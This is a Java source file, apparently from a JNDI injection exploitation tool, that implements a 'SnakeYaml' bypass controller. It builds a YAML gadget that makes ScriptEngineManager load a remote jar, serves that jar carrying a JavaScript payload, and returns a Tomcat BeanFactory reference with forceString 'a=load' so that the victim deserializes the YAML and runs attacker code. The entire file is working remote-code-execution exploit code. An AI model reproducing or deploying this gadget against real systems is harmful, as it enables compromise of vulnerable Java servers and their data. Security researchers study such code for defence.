package map.jndi.controller.bypass;

import map.jndi.Config;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.server.WebServer;
import map.jndi.template.ScriptEngineFactoryTemplate;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;
import map.jndi.util.PayloadUtil;
import map.jndi.util.ReflectUtil;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");

        String factoryClassName = MiscUtil.getRandStr(12);
        String jarName = MiscUtil.getRandStr(12);

        String code = PayloadUtil.getJavaScriptPayload(byteCode);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"" + Config.codebase + jarName + ".jar" + "\"]\n" +
                "  ]]\n" +
                "]";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), factoryClassName);
            ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));

            jarBytes = JarUtil.createWithSPI("javax.script.ScriptEngineFactory", factoryClassName, clazz.toBytecode());
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
